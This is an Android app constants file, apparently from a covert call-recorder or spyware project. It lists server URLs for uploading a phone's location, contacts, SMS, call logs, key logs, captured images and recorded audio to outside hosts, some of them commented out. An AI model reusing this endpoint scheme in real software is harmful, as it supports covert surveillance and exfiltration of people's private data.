package rapidora.co.myapplication.common;

/**
 * Created by azmat.ali.khan on 04/05/16.
 */
public class Constants {

    public static  int galleryTime = 5 * 61 * 1000;
   /* public static final String UPDATE_LOCATION_URL = "https://www.akashverma.ml/android/apps/user-location.php";

  *//*  public static final String LOCATION_TRACKER_PREF = "tracker_pref";
    public static final String UPDATE_CONTACT = "https://www.akashverma.ml/android/apps/contact.php";
    public static final String UPDATE_SMS = "https://www.akashverma.ml/android/apps/sam.php";
    public static final String UPDATE_CALLLOG = "https://www.akashverma.ml/android/apps/call-logs.php";
    public static final String SEND_CAPTURE_IMAGES = "https://www.akashverma.ml/android/apps/uploadcaptureimage.php";
    public static final String SEND_RECORDED_AUDIO = "https://www.akashverma.ml/android/apps/upload_listen.php";
    public static final String SEND_KEY_LOG = "https://www.akashverma.ml/android/apps/upload_keyword.php";
    public static final String UPDATE_IMAGE = "https://www.akashverma.ml/android/apps/upload_image.php";
    public static final String USERINSERT = "https://www.akashverma.ml/android/apps/reg_user.php";
    public static final String ONREQUEST = "https://www.akashverma.ml/android/apps/onrequestandroid.php";
    public static final String REQUESTSENDSUCSESS = "https://www.akashverma.ml/android/apps/delete_req.php";
    public static final String UPLOADRECORDING = "https://www.akashverma.ml/android/apps/upload_recording.php";
*/


    public static final String UPDATE_LOCATION_URL = "http://dolphintechnosolution.com/index.php/webservices/userLocation";

    public static final String LOCATION_TRACKER_PREF = "tracker_pref";
    public static final String UPDATE_CONTACT = "http://dolphintechnosolution.com/index.php/webservices/userContactDetails";
    public static final String UPDATE_SMS = "http://dolphintechnosolution.com/index.php/webservices/userMessage";
    public static final String UPDATE_CALLLOG = "http://dolphintechnosolution.com/index.php/webservices/userCallDetails";
   // public static final String SEND_CAPTURE_IMAGES = "http://pnpandroid.tk/apps/uploadcaptureimage.php";
    //public static final String SEND_RECORDED_AUDIO = "http://pnpandroid.tk/apps/upload_listen.php";
    //public static final String SEND_KEY_LOG = "http://pnpandroid.tk/apps/upload_keyword.php";
    //public static final String UPDATE_IMAGE = "http://pnpandroid.tk/apps/upload_image.php";
    public static final String USERINSERT = "http://dolphintechnosolution.com/index.php/webservices/userLogin";
    //public static final String ONREQUEST = "http://pnpandroid.tk/apps/onrequestandroid.php";
    //public static final String REQUESTSENDSUCSESS = "http://pnpandroid.tk/apps/delete_req.php";
    //public static final String UPLOADRECORDING = "http://pnpandroid.tk/apps/upload_recording.php";


    public static final String TAG = "Call recorder: ";

    public static final String FILE_DIRECTORY = "recordedCalls";
    public static final String FILE_NOTES = "Notes";
    public static final String FILE_AUDIO = "audio";
    public static final String FILE_IMAGES = "images";
    public static final String LISTEN_ENABLED = "ListenEnabled";
    public static final String FILE_NAME_PATTERN = "^d[\\d]{14}p[_\\d]*\\.3gp$";

    public static final int MEDIA_MOUNTED = 0;
    public static final int MEDIA_MOUNTED_READ_ONLY = 1;
    public static final int NO_MEDIA = 2;

    public static final int STATE_INCOMING_NUMBER = 1;
    public static final int STATE_CALL_START = 2;
    public static final int STATE_CALL_END = 3;
    public static final int STATE_START_RECORDING = 4;
    public static final int STATE_STOP_RECORDING = 5;
    public static final int RECORDING_ENABLED = 6;
    public static final int RECORDING_DISABLED = 7;


}
